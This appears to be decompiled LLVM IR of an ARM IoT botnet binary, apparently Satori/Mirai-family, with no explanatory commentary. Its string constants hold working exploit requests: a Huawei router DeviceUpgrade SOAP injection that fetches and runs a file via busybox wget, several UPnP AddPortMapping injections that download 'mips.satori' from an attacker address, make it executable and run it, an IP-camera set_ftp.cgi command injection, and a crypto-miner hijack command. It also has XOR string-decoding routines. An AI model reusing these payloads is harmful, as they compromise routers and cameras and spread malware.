source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1d27c.14 = global i32 0
@global_var_8db0.18 = constant i32 -382906384
@global_var_1d4ac.21 = global i32 0
@global_var_1d4b0.26 = global i32 0
@global_var_13b14.29 = constant i32 1953775231
@global_var_13b2c.31 = constant i32 1932670822
@global_var_13b44.33 = constant i32 1969760375
@global_var_13b4c.35 = constant i32 1719085162
@global_var_13b54.37 = constant i32 2137139298
@global_var_13b5c.39 = constant i32 1969760375
@global_var_13b6c.41 = constant i32 1661413473
@global_var_13b74.43 = constant i32 1681080118
@global_var_13b88.45 = constant i32 1968137073
@global_var_13b94.47 = constant i32 1684824434
@global_var_13ba0.49 = constant i32 2138204514
@global_var_13bb0.51 = constant i32 1617257838
@global_var_13bbc.53 = constant i32 1414747976
@global_var_13bcc.55 = constant i32 1969513329
@global_var_13bd8.57 = constant i32 1650882160
@global_var_13be4.59 = constant i32 1684235877
@global_var_13bfc.61 = constant i32 1684235877
@global_var_13c20.63 = constant i32 2000041069
@global_var_13c38.65 = constant i32 808283442
@global_var_13c44.67 = constant i32 1632330347
@global_var_13c50.69 = constant i32 1684420192
@global_var_13c68.71 = constant i32 1430283854
@global_var_13c74.73 = constant i32 1953657897
@global_var_13c88.75 = constant i32 1969760375
@global_var_13c98.77 = constant i32 1953656873
@global_var_13cac.79 = constant i32 1953658665
@global_var_13cc0.81 = constant [51 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXubuheshz%\00"
@global_var_13cf4.83 = constant [53 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXub`tsfs6sz%\00"
@global_var_1d4b4.85 = global i32 0
@global_var_13d2c.88 = constant i32 47
@global_var_1d328.90 = global i32 -1
@global_var_1ffa8.93 = global i32 0
@global_var_13ffc.99 = constant i32 10
@global_var_13e0c.101 = constant [5 x i8] c"arm7\00"
@global_var_1d32c.104 = global i32 -1
@global_var_c4d8.109 = constant i32 -442515360
@global_var_13e14.111 = constant i32 16777216
@global_var_1d4bc.114 = global i32 0
@global_var_1d4c8.116 = global i32 0
@global_var_1d4c0.118 = global i32 0
@global_var_1d4c4.120 = global i32 0
@global_var_1d330.122 = constant [27 x i8] c"AVPNWGUZLYORESJTHQDFCXBIMK\00"
@global_var_e720.129 = constant i32 -450904024
@global_var_1d4cc.131 = global i32 0
@global_var_1d4d8.135 = global i32 0
@global_var_d458.137 = constant i32 -382909968
@global_var_13e1c.142 = constant [26 x i8] c"EthDcrMiner64.exe -epool \00"
@global_var_13e38.144 = constant [8 x i8] c" -ewal \00"
@global_var_13e34.146 = constant i32 32
@global_var_13e40.148 = constant [27 x i8] c"-mode 1 -mport 3333 -mpsw \00"
@global_var_13e5c.150 = constant [3 x i8] c"%x\00"
@global_var_13e60.152 = constant [71 x i8] c"{\22id\22:0,\22jsonrpc\22:\222.0\22,\22method\22:\22miner_file\22,\22params\22:[\22reboot.bat\22,\22\00"
@global_var_13ea8.154 = constant [5 x i8] c"\22]}\22\00"
@global_var_1d4d4.158 = global i32 0
@global_var_a908.159 = constant i32 120024
@global_var_13eb0.161 = constant [62 x i8] c"bdoh,*b,%p`bs,ossw=([(6?2)15)6??)??(e(`,*H,(sjw()d%,9,(sjw()a\00"
@global_var_13ef0.163 = constant [32 x i8] c"bdoh,*b,%to,(sjw()d%,99,(sjw()a\00"
@global_var_13f10.165 = constant [11 x i8] c"to,(sjw()a\00"
@global_var_13f1c.168 = constant [18 x i8] c"GET login.cgi\0D\0A\0D\0A\00"
@global_var_13f30.170 = constant [10 x i8] c"loginuser\00"
@global_var_14d88.172 = constant [9 x i8] c"\0A\0D=\22 \0A\0D\22\00"
@global_var_bfe0.173 = constant i32 -369093622
@1 = constant i32 59
@global_var_13f40.177 = constant [27 x i8] c"GET /set_ftp.cgi?loginuse=\00"
@global_var_13f5c.179 = constant [11 x i8] c"&loginpas=\00"
@global_var_13f68.181 = constant [88 x i8] c"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28\00"
@global_var_13fc0.183 = constant [17 x i8] c"%29 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_13fd4.185 = constant [27 x i8] c"GET /ftptest.cgi?loginuse=\00"
@global_var_13ff0.187 = constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00"
@global_var_14000.190 = constant [860 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AHost: 127.0.0.1:37215\0D\0AUser-Agent: Hello-World\0D\0AContent-Length: 413\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAccept-Encoding: gzip, deflate\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?>\0D\0A    <s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22>\0D\0A    <s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22>\0D\0A    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\0D\0A<NewDownloadURL></NewDownloadURL>\0D\0A</u:Upgrade>\0D\0A    </s:Body>\0D\0A    </s:Envelope>\0D\0A\0D\0A\00"
@global_var_1435c.192 = constant [3 x i8] c"\0D\0A\00"
@global_var_14360.194 = constant [14 x i8] c"\22error\22: null\00"
@global_var_14370.196 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_146c4.198 = constant [880 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 642\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_14a34.200 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_1d4dc.202 = global i32 0
@global_var_1d280.213 = global i32 0
@global_var_11ab8.215 = constant i32 -369098676
@global_var_bbd8.232 = constant i32 -443088884
@global_var_c06c.248 = constant i32 -456978431
@global_var_11120.258 = constant i32 -481165300
@global_var_10f9c.268 = constant i32 -481099766
@global_var_10d1c.283 = constant i32 436207624
@global_var_c7d8.292 = constant i32 -478871519
@global_var_d2a4.310 = constant i32 -382906384
@global_var_f1a0.319 = constant i32 -442544040
@global_var_da28.338 = constant i32 -369098502
@global_var_20000.340 = global i32 0
@global_var_ed2c.364 = constant i32 436207625
@global_var_e5ac.365 = constant i32 -2020859901
@global_var_e698.368 = constant i32 -494075872
@global_var_f510.369 = constant i32 -382910336
@global_var_20334.372 = local_unnamed_addr global i32 0
@global_var_d6d4.386 = constant i32 -442543860
@global_var_bfd0.394 = constant i32 -369093618
@global_var_f67c.420 = constant i32 -382910352
@global_var_e3fc.444 = constant i32 -382910288
@global_var_10a8c.445 = constant i32 -382906384
@global_var_20003.456 = global i32 0
@global_var_1054c.475 = constant i32 -382910448
@global_var_12334.476 = constant i32 -382909968
@global_var_11264.492 = constant i32 -528412670
@global_var_110ac.493 = constant i32 -493740028
@global_var_110dc.494 = constant i32 -496189436
@global_var_1110c.495 = constant i32 -473886717
@global_var_11038.496 = constant i32 -497934328
@global_var_111f8.497 = constant i32 -481165300
@global_var_111d8.498 = constant i32 -509556690
@global_var_11904.509 = constant i32 -478805983
@global_var_1d490.4 = external global i8*
@global_var_1d4b8.106 = external global i8*
@global_var_1d4d0.133 = global i16* null
@global_var_1d4d1.136 = global i16 0
@global_var_1d4e0.205 = external global i8*
@global_var_1d2d8.209 = local_unnamed_addr global i16 8
@global_var_13f3c.175 = constant [2 x i8] c";\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80d4() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @function_80f0() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_1d490.4 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_1d490.4 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_1d490.4, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @function_8134() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_1d27c.14, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_1d27c.14 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1d27c.14, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @function_ec10(i32 ptrtoint (i32* @global_var_8db0.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 80644, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @function_d6d4()
  ret i32 %v0_81c0
}

define i32 @function_81d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_81d0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  store i32 %v3_81d0, i32* %stack_var_-8, align 4
  %storemerge3 = load i32, i32* @global_var_1d4ac.21, align 4
  store i32 %storemerge3, i32* %ip.global-to-local, align 4
  %v2_82a45 = icmp eq i32 %storemerge3, 0
  br i1 %v2_82a45, label %dec_label_pc_82ac, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %dec_label_pc_81d0, %dec_label_pc_82a0
  %v0_82a0 = phi i32 [ %storemerge, %dec_label_pc_82a0 ], [ %storemerge3, %dec_label_pc_81d0 ]
  %v1_81e0 = inttoptr i32 %v0_82a0 to i32*
  %v2_81e0 = load i32, i32* %v1_81e0, align 4
  %tmp16 = icmp sgt i32 %v2_81e0, 0
  %v0_81ec = load i32, i32* %r0.global-to-local, align 4
  %v9_81ec = icmp eq i32 %v0_81ec, %v2_81e0
  %or.cond = and i1 %tmp16, %v9_81ec
  br i1 %or.cond, label %dec_label_pc_81f4, label %dec_label_pc_82a0

dec_label_pc_81f4:                                ; preds = %dec_label_pc_81e0
  %v1_81f4 = add i32 %v0_82a0, 10
  %v2_81f4 = inttoptr i32 %v1_81f4 to i8*
  %v3_81f4 = load i8, i8* %v2_81f4, align 1
  %v2_81f8 = icmp eq i8 %v3_81f4, 0
  br i1 %v2_81f8, label %dec_label_pc_82b4, label %dec_label_pc_8200

dec_label_pc_8200:                                ; preds = %dec_label_pc_81f4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -19, i32* %r4.global-to-local, align 4
  store i32 -22, i32* %lr.global-to-local, align 4
  store i32 -34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8258

dec_label_pc_8214:                                ; preds = %dec_label_pc_8258
  %v1_8214 = add i32 %v0_8214, 4
  %v2_8214 = inttoptr i32 %v1_8214 to i32*
  %v3_8214 = load i32, i32* %v2_8214, align 4
  %v2_8218 = add i32 %v3_8214, %v2_8220
  %v3_8218 = inttoptr i32 %v2_8218 to i8*
  %v4_8218 = load i8, i8* %v3_8218, align 1
  %v6_8218 = zext i8 %v4_8218 to i32
  %v1_821c = load i32, i32* %r4.global-to-local, align 4
  %v2_821c = xor i32 %v1_821c, %v6_8218
  %v1_8220 = trunc i32 %v2_821c to i8
  store i8 %v1_8220, i8* %v3_8218, align 1
  %v0_8224 = load i32, i32* %ip.global-to-local, align 4
  %v1_8224 = add i32 %v0_8224, 4
  %v2_8224 = inttoptr i32 %v1_8224 to i32*
  %v3_8224 = load i32, i32* %v2_8224, align 4
  %v0_8228 = load i32, i32* %r1.global-to-local, align 4
  %v2_8228 = add i32 %v0_8228, %v3_8224
  %v3_8228 = inttoptr i32 %v2_8228 to i8*
  %v4_8228 = load i8, i8* %v3_8228, align 1
  %v6_8228 = zext i8 %v4_8228 to i32
  %v1_822c = load i32, i32* %lr.global-to-local, align 4
  %v2_822c = xor i32 %v1_822c, %v6_8228
  %v1_8230 = trunc i32 %v2_822c to i8
  store i8 %v1_8230, i8* %v3_8228, align 1
  %v0_8234 = load i32, i32* %ip.global-to-local, align 4
  %v1_8234 = add i32 %v0_8234, 4
  %v2_8234 = inttoptr i32 %v1_8234 to i32*
  %v3_8234 = load i32, i32* %v2_8234, align 4
  %v0_8238 = load i32, i32* %r1.global-to-local, align 4
  %v2_8238 = add i32 %v0_8238, %v3_8234
  %v3_8238 = inttoptr i32 %v2_8238 to i8*
  %v4_8238 = load i8, i8* %v3_8238, align 1
  %v6_8238 = zext i8 %v4_8238 to i32
  %v1_823c = load i32, i32* %r0.global-to-local, align 4
  %v2_823c = xor i32 %v1_823c, %v6_8238
  %v1_8240 = trunc i32 %v2_823c to i8
  store i8 %v1_8240, i8* %v3_8238, align 1
  %v0_8244 = load i32, i32* %ip.global-to-local, align 4
  %v1_8244 = add i32 %v0_8244, 4
  %v2_8244 = inttoptr i32 %v1_8244 to i32*
  %v3_8244 = load i32, i32* %v2_8244, align 4
  store i32 %v3_8244, i32* @r2, align 4
  %v0_8248 = load i32, i32* %r1.global-to-local, align 4
  %v2_8248 = add i32 %v0_8248, %v3_8244
  %v3_8248 = inttoptr i32 %v2_8248 to i8*
  %v4_8248 = load i8, i8* %v3_8248, align 1
  %v6_8248 = zext i8 %v4_8248 to i32
  %v1_824c = load i32, i32* %r0.global-to-local, align 4
  %v2_824c = xor i32 %v1_824c, %v6_8248
  %v1_8250 = trunc i32 %v2_824c to i8
  store i8 %v1_8250, i8* %v3_8248, align 1
  %v0_8254 = load i32, i32* %r1.global-to-local, align 4
  %v1_8254 = add i32 %v0_8254, 1
  store i32 %v1_8254, i32* %r1.global-to-local, align 4
  %v0_8258.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_8200, %dec_label_pc_8214
  %v2_8220 = phi i32 [ 0, %dec_label_pc_8200 ], [ %v1_8254, %dec_label_pc_8214 ]
  %v0_8214 = phi i32 [ %v0_82a0, %dec_label_pc_8200 ], [ %v0_8258.pre, %dec_label_pc_8214 ]
  %v1_8258 = add i32 %v0_8214, 8
  %v2_8258 = inttoptr i32 %v1_8258 to i16*
  %v3_8258 = load i16, i16* %v2_8258, align 2
  %v4_8258 = zext i16 %v3_8258 to i32
  %v5_8260 = icmp slt i32 %v2_8220, %v4_8258
  br i1 %v5_8260, label %dec_label_pc_8214, label %dec_label_pc_8290

dec_label_pc_826c:                                ; preds = %dec_label_pc_8290
  %v1_826c = add i32 %v0_826c, 4
  %v2_826c = inttoptr i32 %v1_826c to i32*
  %v3_826c = load i32, i32* %v2_826c, align 4
  %v2_8270 = add i32 %v3_826c, %v3_827c
  %v1_8274 = add i32 %v2_8270, 1
  %v2_8274 = inttoptr i32 %v1_8274 to i8*
  %v3_8274 = load i8, i8* %v2_8274, align 1
  %v4_8274 = zext i8 %v3_8274 to i32
  store i32 %v4_8274, i32* @r2, align 4
  %v3_8278 = inttoptr i32 %v2_8270 to i8*
  %v4_8278 = load i8, i8* %v3_8278, align 1
  %v6_8278 = zext i8 %v4_8278 to i32
  store i32 %v6_8278, i32* %r1.global-to-local, align 4
  store i8 %v3_8274, i8* %v3_8278, align 1
  %v0_8280 = load i32, i32* %ip.global-to-local, align 4
  %v1_8280 = add i32 %v0_8280, 4
  %v2_8280 = inttoptr i32 %v1_8280 to i32*
  %v3_8280 = load i32, i32* %v2_8280, align 4
  %v0_8284 = load i32, i32* %r0.global-to-local, align 4
  %v2_8284 = add i32 %v0_8284, %v3_8280
  %v0_8288 = load i32, i32* %r1.global-to-local, align 4
  %v1_8288 = trunc i32 %v0_8288 to i8
  %v3_8288 = add i32 %v2_8284, 1
  %v4_8288 = inttoptr i32 %v3_8288 to i8*
  store i8 %v1_8288, i8* %v4_8288, align 1
  %v0_828c = load i32, i32* %r0.global-to-local, align 4
  %v1_828c = add i32 %v0_828c, 2
  %v0_8290.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8258, %dec_label_pc_826c
  %v0_826c = phi i32 [ %v0_8290.pre, %dec_label_pc_826c ], [ %v0_8214, %dec_label_pc_8258 ]
  %v3_827c = phi i32 [ %v1_828c, %dec_label_pc_826c ], [ 0, %dec_label_pc_8258 ]
  store i32 %v3_827c, i32* %r0.global-to-local, align 4
  %v1_8290 = add i32 %v0_826c, 8
  %v2_8290 = inttoptr i32 %v1_8290 to i16*
  %v3_8290 = load i16, i16* %v2_8290, align 2
  %v4_8290 = zext i16 %v3_8290 to i32
  %v5_8298 = icmp slt i32 %v3_827c, %v4_8290
  br i1 %v5_8298, label %dec_label_pc_826c, label %dec_label_pc_82ac

dec_label_pc_82a0:                                ; preds = %dec_label_pc_81e0
  %v1_82a0 = add i32 %v0_82a0, 12
  %v2_82a0 = inttoptr i32 %v1_82a0 to i32*
  %storemerge = load i32, i32* %v2_82a0, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v2_82a4 = icmp eq i32 %storemerge, 0
  br i1 %v2_82a4, label %dec_label_pc_82a4.dec_label_pc_82ac.loopexit2_crit_edge, label %dec_label_pc_81e0

dec_label_pc_82a4.dec_label_pc_82ac.loopexit2_crit_edge: ; preds = %dec_label_pc_82a0
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8290, %dec_label_pc_81d0, %dec_label_pc_82a4.dec_label_pc_82ac.loopexit2_crit_edge
  %v2_82b0 = phi i32 [ 0, %dec_label_pc_82a4.dec_label_pc_82ac.loopexit2_crit_edge ], [ 0, %dec_label_pc_81d0 ], [ %v0_826c, %dec_label_pc_8290 ]
  %v3_82b0 = add i32 %v2_82b0, 10
  %v4_82b0 = inttoptr i32 %v3_82b0 to i8*
  store i8 0, i8* %v4_82b0, align 1
  %v2_82b4.pre = load i32, i32* %stack_var_-8, align 4
  %v1_82b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %dec_label_pc_81f4, %dec_label_pc_82ac
  %v1_82b8 = phi i32 [ %v2_81e0, %dec_label_pc_81f4 ], [ %v1_82b8.pre, %dec_label_pc_82ac ]
  %v2_82b4 = phi i32 [ %v3_81d0, %dec_label_pc_81f4 ], [ %v2_82b4.pre, %dec_label_pc_82ac ]
  store i32 %v2_82b4, i32* @r4, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_827c, { 1, 2, 0 }
  uselistorder i32 %v0_826c, { 0, 2, 1 }
  uselistorder i32 %v0_8214, { 0, 2, 1 }
  uselistorder i32 %v2_8220, { 1, 0 }
  uselistorder i32 %v2_81e0, { 2, 1, 0 }
  uselistorder i32 %v0_82a0, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 7, 8, 5, 6, 2, 3, 4, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 0, 6, 2, 1, 3, 4, 5, 7 }
  uselistorder label %dec_label_pc_82b4, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8290, { 1, 0 }
  uselistorder label %dec_label_pc_8258, { 1, 0 }
  uselistorder label %dec_label_pc_81e0, { 1, 0 }
}

define i32 @function_82c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_82c0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_82c0 = load i32, i32* @r4, align 4
  store i32 %v3_82c0, i32* %stack_var_-8, align 4
  %storemerge3 = load i32, i32* @global_var_1d4ac.21, align 4
  store i32 %storemerge3, i32* %ip.global-to-local, align 4
  %v2_83985 = icmp eq i32 %storemerge3, 0
  br i1 %v2_83985, label %dec_label_pc_83a0, label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_82c0, %dec_label_pc_8394
  %v0_8394 = phi i32 [ %storemerge, %dec_label_pc_8394 ], [ %storemerge3, %dec_label_pc_82c0 ]
  %v1_82d0 = inttoptr i32 %v0_8394 to i32*
  %v2_82d0 = load i32, i32* %v1_82d0, align 4
  %tmp16 = icmp sgt i32 %v2_82d0, 0
  %v0_82dc = load i32, i32* %r0.global-to-local, align 4
  %v9_82dc = icmp eq i32 %v0_82dc, %v2_82d0
  %or.cond = and i1 %tmp16, %v9_82dc
  br i1 %or.cond, label %dec_label_pc_82e4, label %dec_label_pc_8394

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d0
  %v1_82e4 = add i32 %v0_8394, 10
  %v2_82e4 = inttoptr i32 %v1_82e4 to i8*
  %v3_82e4 = load i8, i8* %v2_82e4, align 1
  %v4_82e4 = zext i8 %v3_82e4 to i32
  %v2_82e8 = icmp eq i8 %v3_82e4, 0
  br i1 %v2_82e8, label %dec_label_pc_82f0, label %dec_label_pc_83a8

dec_label_pc_82f0:                                ; preds = %dec_label_pc_82e4
  store i32 %v4_82e4, i32* @r1, align 4
  store i32 -19, i32* %r4.global-to-local, align 4
  store i32 -22, i32* %lr.global-to-local, align 4
  store i32 -34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8348

dec_label_pc_8304:                                ; preds = %dec_label_pc_8348
  %v1_8304 = add i32 %v0_8304, 4
  %v2_8304 = inttoptr i32 %v1_8304 to i32*
  %v3_8304 = load i32, i32* %v2_8304, align 4
  %v2_8308 = add i32 %v3_8304, %v2_8310
  %v3_8308 = inttoptr i32 %v2_8308 to i8*
  %v4_8308 = load i8, i8* %v3_8308, align 1
  %v6_8308 = zext i8 %v4_8308 to i32
  %v1_830c = load i32, i32* %r4.global-to-local, align 4
  %v2_830c = xor i32 %v1_830c, %v6_8308
  %v1_8310 = trunc i32 %v2_830c to i8
  store i8 %v1_8310, i8* %v3_8308, align 1
  %v0_8314 = load i32, i32* %ip.global-to-local, align 4
  %v1_8314 = add i32 %v0_8314, 4
  %v2_8314 = inttoptr i32 %v1_8314 to i32*
  %v3_8314 = load i32, i32* %v2_8314, align 4
  %v0_8318 = load i32, i32* @r1, align 4
  %v2_8318 = add i32 %v0_8318, %v3_8314
  %v3_8318 = inttoptr i32 %v2_8318 to i8*
  %v4_8318 = load i8, i8* %v3_8318, align 1
  %v6_8318 = zext i8 %v4_8318 to i32
  %v1_831c = load i32, i32* %lr.global-to-local, align 4
  %v2_831c = xor i32 %v1_831c, %v6_8318
  %v1_8320 = trunc i32 %v2_831c to i8
  store i8 %v1_8320, i8* %v3_8318, align 1
  %v0_8324 = load i32, i32* %ip.global-to-local, align 4
  %v1_8324 = add i32 %v0_8324, 4
  %v2_8324 = inttoptr i32 %v1_8324 to i32*
  %v3_8324 = load i32, i32* %v2_8324, align 4
  %v0_8328 = load i32, i32* @r1, align 4
  %v2_8328 = add i32 %v0_8328, %v3_8324
  %v3_8328 = inttoptr i32 %v2_8328 to i8*
  %v4_8328 = load i8, i8* %v3_8328, align 1
  %v6_8328 = zext i8 %v4_8328 to i32
  %v1_832c = load i32, i32* %r0.global-to-local, align 4
  %v2_832c = xor i32 %v1_832c, %v6_8328
  %v1_8330 = trunc i32 %v2_832c to i8
  store i8 %v1_8330, i8* %v3_8328, align 1
  %v0_8334 = load i32, i32* %ip.global-to-local, align 4
  %v1_8334 = add i32 %v0_8334, 4
  %v2_8334 = inttoptr i32 %v1_8334 to i32*
  %v3_8334 = load i32, i32* %v2_8334, align 4
  %v0_8338 = load i32, i32* @r1, align 4
  %v2_8338 = add i32 %v0_8338, %v3_8334
  %v3_8338 = inttoptr i32 %v2_8338 to i8*
  %v4_8338 = load i8, i8* %v3_8338, align 1
  %v6_8338 = zext i8 %v4_8338 to i32
  %v1_833c = load i32, i32* %r0.global-to-local, align 4
  %v2_833c = xor i32 %v1_833c, %v6_8338
